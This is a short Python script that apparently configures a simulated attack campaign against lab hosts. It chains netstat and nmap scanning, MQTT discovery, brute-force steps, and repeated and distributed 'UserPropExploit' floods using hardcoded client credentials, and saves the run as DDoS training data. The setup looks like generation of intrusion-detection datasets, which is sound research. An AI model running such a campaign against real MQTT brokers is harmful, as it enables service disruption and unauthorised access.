from APT import *

step_seq = [(NetstatStep(5), 10), (Nmap192T4Step(10), 2), (Nmap192T5Step(10), 2), (Nmap10T4Step(10), 4),
            (Nmap10T5Step(10), 4), (PauseStep(60), 1), (BruteForceStep(10, action='t'),),
            (NmapMQTTDiscStep("10.0.0.5"), 1), (NmapSubDiscStep("10.0.0.5", pause=10), 10),
            (NmapBannerDiscStep("10.0.0.5", pause=10), 5),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=1800, number=18000), 1),
            (PauseStep(60), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, action='t'), 2),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 10,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=72000, pause=2)), 2),
            (PauseStep(60), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=180, pause=5), 20),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=1800, number=18000), 1),
            (PauseStep(60), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, is_distributed=True, action='t'),),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 10,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=72000, pause=2)), 2),
            (PauseStep(60), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=180, pause=5), 20),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=1800, number=18000), 1),
            (PauseStep(60), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, action='t'),),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 10,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=72000, pause=2)), 2),
            (PauseStep(60), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=180, pause=5), 20),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=1800, number=18000), 1),
            (PauseStep(60), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, action='t'), 2),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 10,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=72000, pause=2)), 2),
            (PauseStep(60), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=180, pause=5), 20),
            ]
exp_details = []
atk = APTAttack(step_seq, "user_prop_ddos_camp_train", exp_details, "/output/experiment_details.pkl")
atk.run()
atk.save_in()
